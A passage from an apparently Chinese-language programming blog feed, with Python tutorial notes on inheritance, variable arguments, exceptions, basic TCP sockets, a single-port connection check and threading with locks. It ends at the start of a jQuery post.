</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>:</span>        <span class="comment"># 定义父类</span></span><br><span class="line">   parentAttr = <span class="number">100</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;调用父类构造函数&quot;</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">parentMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;调用父类方法&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">setAttr</span>(<span class="params">self, attr</span>):</span></span><br><span class="line">      Parent.parentAttr = attr</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">getAttr</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;父类属性 :&quot;</span>, Parent.parentAttr)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Parent</span>):</span> <span class="comment"># 定义子类    class 子类名(父类名):  #子类格式   </span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;调用子类构造方法&quot;</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">childMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;调用子类方法&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">c = Child()          <span class="comment"># 实例化子类</span></span><br><span class="line">c.childMethod()      <span class="comment"># 调用子类的方法</span></span><br><span class="line">c.parentMethod()     <span class="comment"># 调用父类方法</span></span><br><span class="line">c.setAttr(<span class="number">200</span>)       <span class="comment"># 再次调用父类的方法 - 设置属性值</span></span><br><span class="line">c.getAttr()          <span class="comment"># 再次调用父类的方法 - 获取属性值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>*args和**kwargs</strong></p><p><em><strong>args</strong>就是就是传递一个可变</em>*参数列表**给函数实参，这个参数列表的数目未知，甚至长度可以为0。</p><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_args</span>(<span class="params">first, *args</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Required argument: &#x27;</span>, first)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args))</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Optional argument: &#x27;</span>, v)</span><br><span class="line"></span><br><span class="line">test_args(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><strong>**weargs</strong>则是将一个可变的关键字参数的字典传给函数实参，同样参数列表长度可以为0或为其他值。</p><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_kwargs</span>(<span class="params">first, *args, **kwargs</span>):</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;Required argument: &#x27;</span>, first)</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">type</span>(kwargs))</span><br><span class="line">   <span class="keyword">for</span> v <span class="keyword">in</span> args:</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;Optional argument (args): &#x27;</span>, v)</span><br><span class="line">   <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;Optional argument %s (kwargs): %s&#x27;</span> % (k, v))</span><br><span class="line"></span><br><span class="line">test_kwargs(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, k1=<span class="number">5</span>, k2=<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p><strong>方法重写</strong></p><p>如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>:</span>        <span class="comment"># 定义父类</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      a = <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;调用父类方法&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Parent</span>):</span> <span class="comment"># 定义子类</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      a = <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&#x27;调用子类方法&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">c = Child()          <span class="comment"># 子类实例</span></span><br><span class="line">c.myMethod()         <span class="comment"># 子类调用重写方法</span></span><br></pre></td></tr></table></figure><p><strong>运算符重载</strong></p><h2 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h2><p>错误:Python 的语法错误或者称之为解析错</p><p>异常:即便 Python 程序的语法是正确的，在运行它的时候，也有可能发生错误。</p><h3 id="try-except"><a href="#try-except" class="headerlink" title="try/except"></a>try/except</h3><p>异常捕捉可以使用 <strong>try/except</strong> 语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个数字: &quot;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;您输入的不是数字，请再次尝试输入！&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="try-except…else"><a href="#try-except…else" class="headerlink" title="try/except…else"></a>try/except…else</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个数字: &quot;</span>))<span class="comment">#捕获异常的代码块</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;您输入的不是数字，请再次尝试输入！&quot;</span>) <span class="comment">#发生异常时的执行的代码</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;您输入数字是:&quot;</span>,x)<span class="comment">#没有异常执行的代码块</span></span><br><span class="line"> <span class="keyword">finally</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;感谢你的输入!&quot;</span>)<span class="comment">#有没有异常都被执行的代码块</span></span><br></pre></td></tr></table></figure><h2 id="socket网络编程"><a href="#socket网络编程" class="headerlink" title="socket网络编程"></a>socket网络编程</h2><p>socket函数:</p><ul><li>family: 套接字家族可以使 AF_UNIX 或者 AF_INET。</li><li>type: 套接字类型可以根据是面向连接的还是非连接分为 <code>SOCK_STREAM</code> 或 <code>SOCK_DGRAM</code>。SOCK_STREAM为TCP,SOCK_DGRAM为UDP</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/05232335-fb19fc7527e944d4845ef40831da4ec2.png" alt="img"></p><p><strong>client:</strong></p><p>连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket<span class="comment"># 客户端 发送一个数据，再接收一个数据</span></span><br><span class="line">client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) <span class="comment">#声明socket类型，同时生成链接对象</span></span><br><span class="line">client.connect((<span class="string">&#x27;192.168.182.182&#x27;</span>,<span class="number">9090</span>)) <span class="comment">#建立一个链接，连接到本地的6969端口</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = <span class="built_in">input</span>(<span class="string">&#x27;请输入:&#x27;</span>)  <span class="comment">#strip默认取出字符串的头尾空格</span></span><br><span class="line">    data = client.recv(<span class="number">1024</span>) <span class="comment">#接收一个信息，并指定接收的大小 为1024字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;recv:&#x27;</span>,data.decode()) <span class="comment">#输出我接收的信息</span></span><br><span class="line">    client.send(d.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment">#发送一条信息 python3 只接收btye流</span></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure><p><strong>server:</strong></p><p>监听本地端口连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 建立一个服务端</span></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9090</span>)) <span class="comment">#绑定要监听的端口</span></span><br><span class="line">server.listen(<span class="number">5</span>) <span class="comment">#开始监听 表示可以使用五个链接排队</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:<span class="comment"># conn就是客户端链接过来而在服务端为期生成的一个链接实例</span></span><br><span class="line">        conn,addr = server.accept() <span class="comment">#等待链接,多个链接的时候就会出现问题,其实返回了两个值</span></span><br><span class="line">        <span class="built_in">print</span>(conn,addr)</span><br><span class="line">        welcome = <span class="string">&quot;welcome to my room!&quot;</span></span><br><span class="line">        conn.send(welcome.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                data = conn.recv(<span class="number">1024</span>)  <span class="comment">#接收数据</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;recive:&#x27;</span>,data.decode()) <span class="comment">#打印接收到的数据</span></span><br><span class="line">                d = <span class="built_in">input</span>(<span class="string">&#x27;请输入:&#x27;</span>)</span><br><span class="line">                conn.send(d.encode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#发送一条信息 python3 只接收btye流</span></span><br><span class="line">        conn.close()</span><br></pre></td></tr></table></figure><p><strong>端口扫描</strong></p><p>connect_ex函数 connect()函数的扩展版本,出错时返回出错码,而不是抛出异常. 如果端口存在返回0.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket           <span class="comment">#导入模块</span></span><br><span class="line"></span><br><span class="line">c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   <span class="comment">#打开socket</span></span><br><span class="line">reslut = c.connect_ex((<span class="string">&quot;192.168.182.182&quot;</span>,<span class="number">8080</span>))        <span class="comment">#尝试连接,connect_ex函数会返回异常,连接成功返回0,连接失败返回10061</span></span><br><span class="line"><span class="built_in">print</span>(reslut)</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>多任务可以由多进程完成，也可以由一个进程内的多线程完成。进程是由若干线程组成的，一个进程至少有一个线程。</p><p>Python的标准库提供了两个模块:<code>threading</code>是高级模块<code>_thread</code>是低级模块</p><p>我们一般选择 threading模块.</p><p>启动一个线程就是把一个函数传入并创建<code>Thread</code>实例，然后调用<code>start()</code>开始执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">参数<span class="number">1</span>,参数<span class="number">2</span></span>):</span></span><br><span class="line">   time.sleep(<span class="number">3</span>)       <span class="comment">#子线程停2s</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;子线程工作完毕&quot;</span>)</span><br><span class="line"> </span><br><span class="line">t_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = threading.Thread(target=run,args=(<span class="string">&#x27;参数1&#x27;</span>,<span class="string">&#x27;参数2&#x27;</span>))  <span class="comment">#创建线程对象</span></span><br><span class="line">    t_list.append(t)     <span class="comment">#添加到进程列表</span></span><br><span class="line">    t.start()<span class="comment">#循环启动进程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> t_list:  </span><br><span class="line">    t.join()<span class="comment">#主线程执行完后等待全部的子线程结束之后，主线程自身才结束.</span></span><br></pre></td></tr></table></figure><p><strong>多线程的默认情况</strong></p><p>Python[多线程]与多进程中join()方法的效果是相同的<br>当一个进程启动之后，会默认产生一个主线程，因为线程是程序执行流的最小单元，当设置多线程时，主线程会创建多个子线程，在python中，默认情况下（其实就是setDaemon(False)），主线程执行完自己的任务以后，就退出了，此时子线程会继续执行自己的任务，直到自己的任务结束，例子一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前线程的名字是： &#x27;</span>, threading.current_thread().name)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;这是主线程：&#x27;</span>, threading.current_thread().name)</span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        thread_list.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;主线程结束！&#x27;</span> , threading.current_thread().name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;一共用时：&#x27;</span>, time.time()-start_time)</span><br></pre></td></tr></table></figure><p><strong>join的作用</strong><br>join所完成的工作就是线程同步，即主线程任务结束之后，进入阻塞状态，一直等待其他的子线程执行结束之后，主线程在终止.希望主线程等等子线程，不要“埋头往前跑”,就要使用join()方法！防止脏数据而使用join()的方法，其实是让多线程变成了单线程，属于因噎废食的做法，正确的做法是使用线程锁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前线程的名字是： &#x27;</span>, threading.current_thread().name)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;这是主线程：&#x27;</span>, threading.current_thread().name)</span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        thread_list.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;主线程结束了！&#x27;</span> , threading.current_thread().name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;一共用时：&#x27;</span>, time.time()-start_time)</span><br></pre></td></tr></table></figure><p><strong>join的timeout参数</strong></p><p>当设置守护线程时，含义是主线程对于子线程等待timeout的时间将会杀死该子线程，最后退出程序。所以说，如果有10个子线程，全部的等待时间就是每个timeout的累加和。简单的来说，就是给每个子线程一个timeout的时间，让他去执行，时间一到，不管任务有没有完成，直接杀死。<br>没有设置守护线程时，主线程将会等待timeout的累加和这样的一段时间，时间一到，主线程结束，但是并没有杀死子线程，子线程依然可以继续执行，直到子线程全部结束，程序退出。</p><p><strong>setDaemon(True)守护进程方法</strong></p><p>当我们使用setDaemon(True)方法，设置子线程为守护线程时，主线程一旦执行结束，则全部线程全部被终止执行，可能出现的情况就是，子线程的任务还没有完全执行结束，就被迫停止.</p><p>例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前线程的名字是： &#x27;</span>, threading.current_thread().name)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;这是主线程：&#x27;</span>, threading.current_thread().name)</span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        thread_list.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)  <span class="comment">#守护进程.</span></span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;主线程结束了！&#x27;</span> , threading.current_thread().name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;一共用时：&#x27;</span>, time.time()-start_time)</span><br></pre></td></tr></table></figure><p><strong>threading模块线程锁类</strong></p><ul><li>Lock 互斥锁</li><li>RLock 可重入锁</li><li>Semaphore 信号</li><li>Event 事件</li><li>Condition 条件</li><li>Barrier “阻碍”</li></ul><p><strong>Lock 互斥锁</strong><br>互斥锁是一种独占锁，同一时刻只有一个线程可以访问共享的数据。使用很简单，初始化锁对象，然后将锁当做参数传递给任务函数，在任务中加锁，使用后释放锁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plus</span>(<span class="params">lk</span>):</span></span><br><span class="line">    <span class="keyword">global</span> number       <span class="comment"># global声明此处的number是外面的全局变量number</span></span><br><span class="line">    lk.acquire()        <span class="comment"># 开始加锁</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):    <span class="comment"># 进行一个大数级别的循环加一运算</span></span><br><span class="line">        number += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;子线程%s运算结束后，number = %s&quot;</span> % (threading.current_thread().getName(), number))</span><br><span class="line">    lk.release()        <span class="comment"># 释放锁，让别的线程也可以访问number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):      <span class="comment"># 用2个子线程，就可以观察到脏数据</span></span><br><span class="line">        t = threading.Thread(target=plus, args=(lock,)) <span class="comment"># 需要把锁当做参数传递给plus函数</span></span><br><span class="line">        t.start()</span><br><span class="line">    time.sleep(<span class="number">2</span>)       <span class="comment"># 等待2秒，确保2个子线程都已经结束运算。</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程执行完毕后，number = &quot;</span>, number)</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://blog.kamino.link/2021/03/01/Python-Multithreading-in-detail/">https://blog.kamino.link/2021/03/01/Python-Multithreading-in-detail/</a></p><p><a href="https://blog.csdn.net/zhuzuwei/article/details/80927554">https://blog.csdn.net/zhuzuwei/article/details/80927554</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jquery ajax及XMLHttpRequest常用方法</title>
      <link href="/posts/2353/"/>
      <url>/posts/2353/</url>
      
        <content type="html"><![CDATA[<h2 id="jquery基础操作"><a href="#jquery基础操作" class="headerlink" title="jquery基础操作"></a>jquery基础操作</h2><h3 id="三种选择器"><a href="#三种选择器" class="headerlink" title="三种选择器"></a>三种选择器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>)      <span class="comment">//元素选择器 </span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>)<span class="comment">//id选择器</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.test&quot;</span>)  <span class="comment">//class选择器</span></span><br></pre></td></tr></table></figure><h3 id="事件方法"><a href="#事件方法" class="headerlink" title="事件方法"></a>事件方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).click();<span class="comment">//点击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).dblclick();  <span class="comment">//双击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).mouseenter(); <span class="comment">//鼠标移动事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).(<span class="built_in">document</span>).ready() <span class="comment">//页面加载完后执行事件</span></span><br></pre></td></tr></table></figure><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="获得内容-text-、html-以及-val"><a href="#获得内容-text-、html-以及-val" class="headerlink" title="获得内容 - text()、html() 以及 val()"></a>获得内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span 